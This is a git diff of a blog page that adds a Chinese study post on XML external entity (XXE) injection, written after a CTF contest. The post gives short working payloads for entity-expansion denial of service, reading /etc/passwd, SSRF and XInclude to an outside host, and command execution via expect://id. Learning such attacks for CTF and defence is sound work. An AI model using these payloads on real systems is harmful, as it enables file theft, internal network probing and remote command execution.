@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title>tags | 大周&#39;blog</title>
+  <title>xxe漏洞学习 | 大周&#39;blog</title>
   <meta name="description" content="ctf萌新" />
   <meta name="keywords" content="ctf,菜鸡,萌新,web,Sakura" />
   
@@ -265,31 +265,151 @@
   </div>
 </header>
 
-      <div class="blank" style="padding-top: 75px;">
-</div>
-<div id="content" class="site-content">
-  <div id="main">
-    <header class="page-header">
-      <h1 class="cat-title">
-      标签云</h1>
-      <span class="cat-des">
-        <p>
-          Tags 12</p>
-      </span>
+      <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/sharejs.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/xbclub/staticCDN@0.6/css/tocbot.css">
+<div class="pattern-center-blank"></div>
+
+  <div class="pattern-center single-center">
+    <!-- 有配图默认渲染第一张 -->
+    <div class="pattern-attachment-img">
+        <img src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200811110729.jpg" class="lazyload" onerror="imgError(this,3)" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;">
+      </div>
+    <header class="pattern-header single-header">
+      <h1 class="entry-title">
+      xxe漏洞学习</h1>
+      <p class="entry-census">
+        <span>
+          <a href="https://www.d1a0.cn" target="_blank" rel="noopener">
+            <img src="https://www.d1a0.cn/images/avatar.jpg">
+          </a>
+        </span>
+        <span>
+          <a href="https://www.d1a0.cn" target="_blank" rel="noopener">d1a0</a>
+        </span>
+        <span class="bull">
+        ·</span>
+        2020-8-11
+        
+      
+        ·<span id="readcount"></span>次阅读
+      
+      </p>
     </header>
-    <div id="main-part">
-   
-        <div class="tag-cloud">
-          <div class="tag-cloud-title">
+  </div>
+
+<div id="content" class="site-content">
+  <div id="primary" class="content-area">
+    <main id="main" class="site-main" role="main">
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"> <!-- 套嵌目录使用（主要为了支援评论）-->
+        
+        <div class="entry-content">
+          <p>前几天ctfshow的webak赛有一道利用xxe漏洞的题，当时看一些xxe的资料也没整出来，想着再学习下。</p>
+<a id="more"></a>
+
+<p>简单来说，XXE就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p>
+<p>XML 指可扩展标记语言（eXtensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言，被设计用来传输和存储数据。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。目前，XML文件作为配置文件（Spring、Struts2等）、文档结构说明文件（PDF、RSS等）、图片格式文件（SVG header）应用比较广泛。 XML 的语法规范由 DTD （Document Type Definition）来进行控制。</p>
+<h4 id="xml声明"><a href="#xml声明" class="headerlink" title="xml声明"></a>xml声明</h4><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; standalone=&quot;yes&quot;?&gt;</code></pre><h4 id="DTD文档类型定义"><a href="#DTD文档类型定义" class="headerlink" title="DTD文档类型定义"></a>DTD文档类型定义</h4><p>1.内部DTD文档</p>
+<pre><code>&lt;!DOCTYPE 根元素[定义内容]&gt;</code></pre><p>2.外部DTD文档</p>
+<pre><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot;&gt;</code></pre><p>3.内外部DTD文档结合</p>
+<pre><code>&lt;!DOCTYPE 根元素 SYSTEM &quot;DTD文件路径&quot; [定义内容]&gt;</code></pre><h3 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h3><pre><code>&lt;!DOCTYPE data [
+&lt;!ELEMENT data (#ANY)&gt;
+&lt;!ENTITY a0 &quot;dos&quot; &gt;
+&lt;!ENTITY a1 &quot;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&amp;a0;&quot;&gt;
+&lt;!ENTITY a2 &quot;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&amp;a1;&quot;&gt;
+]&gt;
+&lt;data&gt;&amp;a2;&lt;/data&gt;</code></pre><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE data [
+&lt;!ELEMENT data (#ANY)&gt;
+&lt;!ENTITY file SYSTEM &quot;file:///etc/passwd&quot;&gt;
+]&gt;
+&lt;data&gt;&amp;file;&lt;/data&gt;</code></pre><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE data SYSTEM &quot;http://publicServer.com/&quot; [
+&lt;!ELEMENT data (#ANY)&gt;
+]&gt;
+&lt;data&gt;4&lt;/data&gt;</code></pre><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;
+&lt;!DOCTYPE GVI [ &lt;!ELEMENT foo ANY &gt;
+&lt;!ENTITY xxe SYSTEM &quot;expect://id&quot; &gt;]&gt;
+&lt;catalog&gt;
+   &lt;core id=&quot;test101&quot;&gt;
+      &lt;description&gt;&amp;xxe;&lt;/description&gt;
+   &lt;/core&gt;
+&lt;/catalog&gt;</code></pre><h3 id="XInclude"><a href="#XInclude" class="headerlink" title="XInclude"></a>XInclude</h3><pre><code>&lt;?xml version=&#39;1.0&#39;?&gt;
+&lt;data xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include href=&quot;http://publicServer.com/file.xml&quot;&gt;&lt;/xi:include&gt;&lt;/data&gt;</code></pre>
+        </div>
+        <!-- .entry-content -->
+        
+        <p></p>
+          
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
           </div>
-          <div class="tag-cloud-tags">
-          <a href="/tags/XXE/" style="font-size: 15px; color: #f66">XXE</a> <a href="/tags/misc/" style="font-size: 15px; color: #f66">misc</a> <a href="/tags/php/" style="font-size: 24px; color: #6685a3">php</a> <a href="/tags/web/" style="font-size: 30px; color: #09c">web</a> <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 27px; color: #338fb8">代码审计</a> <a href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" style="font-size: 21px; color: #997a8f">博客搭建</a> <a href="/tags/%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/" style="font-size: 24px; color: #6685a3">比赛记录</a> <a href="/tags/%E6%B0%B4%E5%8D%9A%E5%AE%A2/" style="font-size: 15px; color: #f66">水博客</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" style="font-size: 15px; color: #f66">漏洞复现</a> <a href="/tags/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/" style="font-size: 18px; color: #cc707a">环境配置</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E5%8E%9F%E7%90%86/" style="font-size: 15px; color: #f66">计算机网络原理</a> <a href="/tags/%E8%B0%B7%E6%AD%8C%E9%95%9C%E5%83%8F/" style="font-size: 15px; color: #f66">谷歌镜像</a>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
+      </article>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+        
+          
+            <div class="post-nepre full next">
+          
+            <a href="/2020/08/08/%E7%99%BD%E5%AB%96%E8%85%BE%E8%AE%AF%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8C%E5%9F%9F%E5%90%8D/" rel="next">
+              <div class="background">
+                
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/xbclub/imageCDN//upload/20200306164050.gif" data-src="https://cdn.jsdelivr.net/gh/lingxin16/photos/upload/20200808160923.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" >
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                白嫖腾讯云服务器和域名</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
+      
+<div id="vcomments"></div>
+<script>
+  window.onload = function(){
+      var valine = new Valine();
+      valine.init({
+        el: '#vcomments',
+        appId: "x4KiIidzwmgCbhqx0TEtQk6W-gzGzoHsz",
+        appKey: "uavnoTMwgQJ0F9RrFiIxxgID",
+        path: window.location.pathname,
+        placeholder: "你是我一生只会遇见一次的惊喜 ..."
+      })
+  }
+</script>
+
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+          <a href="https://www.d1a0.cn" target="_blank" rel="noopener" class="profile gravatar"><img src="https://www.d1a0.cn/images/avatar.jpg" itemprop="image" alt="d1a0" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="https://www.d1a0.cn" target="_blank" itemprop="url" rel="author noopener">d1a0</a>
+            </h3>
           </div>
         </div>
-      </div>
-    
-  </div>
+        <hr>
+        <p><i class="iconfont icon-write"></i></p>
+      </section>
+    </main><!-- #main -->
+  </div><!-- #primary -->
 </div>
+
+
     </div>    
     <div class="ins-search">
     <div class="ins-search-mask"></div>
